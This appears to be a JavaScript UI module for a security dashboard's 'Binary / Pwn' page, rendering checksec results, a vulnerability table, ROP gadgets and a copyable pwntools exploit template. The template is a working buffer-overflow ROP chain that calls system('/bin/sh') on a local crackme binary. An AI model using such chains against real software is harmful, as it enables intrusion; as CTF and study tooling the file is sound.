import { binaryPwnData, reverseData, icons } from '../data.js';

export function renderBinary() {
  const main = document.getElementById('main');
  main.innerHTML = `<div class="main-content">
    <div class="page-header">
      <div><div class="page-title">Binary / Pwn</div><div class="page-subtitle">${binaryPwnData.target} — Exploit development workspace</div></div>
      <div class="page-actions">
        <button class="btn btn-secondary btn-sm">${icons.terminal} Spawn Shell</button>
        <button class="btn btn-primary btn-sm">${icons.play} Run Exploit</button>
      </div>
    </div>
    <div class="split-h split-h-1-1">
      <div>
        ${renderChecksec()}
        ${renderVulnerabilities()}
      </div>
      <div>
        ${renderGadgets()}
        ${renderExploitTemplate()}
      </div>
    </div>
  </div>`;
}

function renderChecksec() {
  const protections = binaryPwnData.checksec.map(p => `
    <div class="re-protection-label">${p.name}</div>
    <div class="re-protection-value ${p.status}">${p.value}</div>
  `).join('');

  return `<div class="section">
    <div class="section-title mb-4">checksec</div>
    <div class="panel"><div class="panel-body"><div class="re-protections">${protections}</div></div></div>
  </div>`;
}

function renderVulnerabilities() {
  const rows = binaryPwnData.vulnerabilities.map(v => `<tr>
    <td><span class="badge badge-dot ${v.severity==='high'?'badge-high':'badge-medium'}">${v.severity.toUpperCase()}</span></td>
    <td class="font-medium">${v.type}</td>
    <td class="mono text-muted" style="font-size:var(--text-xs)">${v.function}</td>
    <td class="mono text-muted" style="font-size:var(--text-xs)">${v.offset}</td>
    <td class="text-secondary" style="font-size:var(--text-xs)">${v.note}</td>
  </tr>`).join('');

  return `<div class="section">
    <div class="section-title mb-4">Vulnerabilities</div>
    <table class="data-table">
      <thead><tr><th>Severity</th><th>Type</th><th>Function</th><th>Offset</th><th>Note</th></tr></thead>
      <tbody>${rows}</tbody>
    </table>
  </div>`;
}

function renderGadgets() {
  const rows = binaryPwnData.gadgets.map(g => `<tr>
    <td class="mono text-muted" style="font-size:var(--text-xs)">${g.addr}</td>
    <td class="mono" style="font-size:var(--text-xs)">${g.instr}</td>
  </tr>`).join('');

  return `<div class="section">
    <div class="section-title mb-4">ROP Gadgets</div>
    <table class="data-table">
      <thead><tr><th>Address</th><th>Instructions</th></tr></thead>
      <tbody>${rows}</tbody>
    </table>
  </div>`;
}

function renderExploitTemplate() {
  const code = `from pwn import *

elf = ELF('./crackme')
p = process('./crackme')

# Buffer overflow at validate_input
# Offset to RIP: 40 bytes
payload = b'A' * 40

# ROP chain
pop_rdi = 0x000011ef
ret = 0x00001016

payload += p64(ret)       # stack alignment
payload += p64(pop_rdi)
payload += p64(next(elf.search(b'/bin/sh')))
payload += p64(elf.symbols['system'])

p.sendlineafter(b'password: ', payload)
p.interactive()`;

  return `<div class="section">
    <div class="section-header">
      <div class="section-title">Exploit Template</div>
      <button class="btn btn-sm btn-ghost">${icons.copy} Copy</button>
    </div>
    <div class="code-viewer"><pre>${code}</pre></div>
  </div>`;
}
